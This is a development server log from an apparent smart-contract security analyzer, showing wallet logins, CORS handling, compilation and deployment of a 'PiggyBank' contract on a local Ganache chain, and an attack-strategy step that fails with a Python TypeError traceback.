2025-06-21 15:34:00,959 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:34:00,963 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 15:34:00,969 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:34:03,548 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_15-34, status: ERROR
2025-06-21 15:34:03,551 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 15:34:03,554 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 15:34:03] "POST /analyze HTTP/1.1" 200 -
2025-06-21 15:34:03,580 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 15:34:03] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 15:34:03,643 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 15:34:03] "GET /history HTTP/1.1" 200 -
2025-06-21 15:35:02,056 - app.app - INFO - Application started
2025-06-21 15:35:02,072 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.22.0.5:8000
2025-06-21 15:35:02,076 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:37:45,346 - app.app - INFO - Application started
2025-06-21 15:37:45,361 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.25.0.5:8000
2025-06-21 15:37:45,364 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:37:48,379 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 15:37:48] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:37:51,723 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 15:37:51] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:37:52,264 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 15:37:52] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:37:53,614 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 15:37:53] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:38:09,174 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 15:38:09] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:43:19,154 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-21 15:43:19,438 - app.app - INFO - Application started
2025-06-21 15:43:19,453 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.26.0.5:8000
2025-06-21 15:43:19,455 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:43:21,778 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:21,782 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:21,788 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:21,790 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-21 15:43:21,795 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:21] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:43:21,812 - app.api.auth - INFO - Received login request with method: POST
2025-06-21 15:43:21,815 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-21 15:43:21,822 - app.api.auth - INFO - Request content type: application/json
2025-06-21 15:43:21,827 - app.api.auth - INFO - Processing JSON request
2025-06-21 15:43:21,831 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:43:22,295 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:43:22,298 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:22,300 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:22,301 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:22,303 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:43:22,305 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:22] "POST /login HTTP/1.1" 200 -
2025-06-21 15:43:29,790 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:29,798 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:29,800 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:29,803 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-21 15:43:29,807 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:29] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 15:43:29,829 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:43:29,840 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 15:43:29,854 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-21 15:43:30,059 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-21 15:43:30,951 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:43:30,953 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 15:43:30,958 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:43:33,354 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_15-43, status: ERROR
2025-06-21 15:43:33,356 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 15:43:33,358 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:33,360 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:33,361 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:33,362 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:43:33,364 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:33] "POST /analyze HTTP/1.1" 200 -
2025-06-21 15:43:33,383 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:33,385 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:33,388 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:33,390 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-21 15:43:33,392 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:33] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 15:43:33,444 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:33,446 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:33,447 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:33,448 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:43:33,450 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:33] "GET /history HTTP/1.1" 200 -
2025-06-21 15:43:51,953 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:43:51,973 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 15:43:51,989 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-21 15:43:52,008 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:43:54,016 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_15-43, status: ERROR
2025-06-21 15:43:54,018 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 15:43:54,020 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:54,023 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:54,024 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:54,026 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:43:54,029 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:54] "POST /analyze HTTP/1.1" 200 -
2025-06-21 15:43:54,065 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:43:54,068 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:43:54,069 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:43:54,071 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:43:54,073 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 15:43:54] "GET /history HTTP/1.1" 200 -
2025-06-21 15:50:48,236 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-21 15:50:48,422 - app.app - INFO - Application started
2025-06-21 15:50:48,436 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.28.0.5:8000
2025-06-21 15:50:48,437 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:50:52,176 - app.api.auth - INFO - Received login request with method: POST
2025-06-21 15:50:52,181 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-21 15:50:52,183 - app.api.auth - INFO - Request content type: application/json
2025-06-21 15:50:52,185 - app.api.auth - INFO - Processing JSON request
2025-06-21 15:50:52,190 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:50:52,653 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:50:52,657 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:50:52,660 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:50:52,662 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:50:52,664 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:50:52,668 - werkzeug - INFO - 172.28.0.1 - - [21/Jun/2025 15:50:52] "POST /login HTTP/1.1" 200 -
2025-06-21 15:51:03,381 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:51:03,402 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 15:51:03,422 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-21 15:51:03,428 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp_wornrq6.sol
2025-06-21 15:51:03,438 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-21 15:51:03,440 - app.services.contract_service - INFO - Compiling contract...
2025-06-21 15:51:03,592 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-21 15:51:04,488 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:51:04,490 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 15:51:04,495 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:51:05,431 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-06-21 15:51:05,433 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-06-21 15:51:05,950 - app.services.contract_service - INFO - Contract PiggyBank deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-06-21 15:51:05,951 - app.services.contract_service - INFO - Setting up contract PiggyBank...
2025-06-21 15:51:06,160 - app.services.contract_service - INFO - Contract PiggyBank setup completed
2025-06-21 15:51:06,162 - app.services.contract_service - INFO - Funding contract PiggyBank for attack testing...
2025-06-21 15:51:06,597 - app.services.contract_service - INFO - Contract PiggyBank funded
2025-06-21 15:51:06,599 - app.services.contract_service - INFO - Building contract observation...
2025-06-21 15:51:06,868 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-21 15:51:06,870 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-21 15:51:06,872 - app.services.contract_service - ERROR - Failed to generate attack strategy: generate_complete_attack_strategy() missing 1 required positional argument: 'observation'
2025-06-21 15:51:06,880 - app.services.contract_service - ERROR - Traceback (most recent call last):
  File "/app/services/contract_service.py", line 186, in analyze_contract_from_code
    attack_strategy = generate_complete_attack_strategy(observation)
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
TypeError: generate_complete_attack_strategy() missing 1 required positional argument: 'observation'

2025-06-21 15:51:06,882 - app.services.contract_service - INFO - Temporary file /tmp/tmp_wornrq6.sol removed
2025-06-21 15:51:06,922 - app.api.contract - INFO - Report saved with filename: PiggyBank_2025-06-21_15-51, status: ERROR
2025-06-21 15:51:06,924 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 15:51:06,926 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:51:06,928 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:51:06,930 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:51:06,932 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:51:06,934 - werkzeug - INFO - 172.28.0.1 - - [21/Jun/2025 15:51:06] "POST /analyze HTTP/1.1" 200 -
2025-06-21 15:51:06,986 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 15:51:06,988 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 15:51:06,989 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 15:51:06,991 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 15:51:06,992 - werkzeug - INFO - 172.28.0.1 - - [21/Jun/2025 15:51:06] "GET /history HTTP/1.1" 200 -
